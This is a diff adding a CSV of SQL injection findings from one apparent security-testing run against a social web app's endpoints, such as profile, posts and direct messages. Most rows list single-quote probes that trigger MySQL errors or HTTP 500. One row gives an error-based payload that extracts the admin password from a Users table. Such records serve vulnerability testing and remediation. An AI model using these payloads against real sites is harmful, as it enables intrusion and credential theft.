@@ -1,0 +1,13 @@
+run_id,endpoint,vulnerability,poc
+20260901-1537-0003,/profile?username=,SQL Injection,"`admin' AND (extractvalue(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'))))-- `"
+20260901-1537-0003,/friends?username=,SQL Injection,`admin'` (triggers MySQL error)
+20260901-1537-0003,/users?search=,SQL Injection,`admin'` (triggers MySQL error)
+20260901-1537-0003,/posts?search=,SQL Injection,`admin'` (triggers MySQL error)
+20260901-1537-0003,"/create_post (POST, content)",SQL Injection,`test post'` (triggers MySQL error)
+20260901-1537-0003,"/edit_post (POST, content)",SQL Injection,`edited post'` (triggers MySQL error)
+20260901-1537-0003,"/remove_request (POST, username)",SQL Injection,`stark'` (triggers MySQL error)
+20260901-1537-0003,"/edit_post (POST, id)",SQL Injection,`1'` (triggers HTTP 500)
+20260901-1537-0003,/direct_messages?username=,SQL Injection,`admin'` (triggers HTTP 500)
+20260901-1537-0003,/requests?username=,SQL Injection,`admin'` (triggers HTTP 500)
+20260901-1537-0003,"/direct_messages (POST, username)",SQL Injection,`stark'` (triggers HTTP 500)
+20260901-1537-0003,"/request_friend (POST, username)",SQL Injection,`stark'` (triggers HTTP 500)
